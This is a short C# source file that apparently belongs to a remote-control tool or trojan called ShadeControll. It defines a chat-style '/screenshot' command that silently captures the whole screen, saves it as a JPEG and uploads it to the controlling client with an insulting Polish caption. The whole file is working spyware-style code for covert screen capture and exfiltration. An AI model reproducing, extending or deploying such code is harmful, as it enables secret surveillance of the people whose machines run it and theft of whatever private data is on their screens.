using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Text;
using System.Threading;

namespace ShadeControll.Commands
{
    class Screenshot_Command : Command
    {
        public Screenshot_Command()
        {
            Name = "/screenshot";
            Description = "Zrobienie zrzutu ekranu komputera.";
        }

        public override void Execute(string[] args)
        {
            if (!Directory.Exists("SCR")) { Directory.CreateDirectory("SCR"); }
            Bitmap captureBitmap = new Bitmap(1920, 1080, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = new Rectangle(new Point(0, 0), new Size(1920, 1080));
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            string fileName = "SCR/" + DateTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".jpg";
            captureBitmap.Save(fileName, ImageFormat.Jpeg);
            Thread.Sleep(1000);
            Program.Client.UploadFile(fileName, "elo pomelo szmaty");
            base.Execute(args);
        }
    }
}
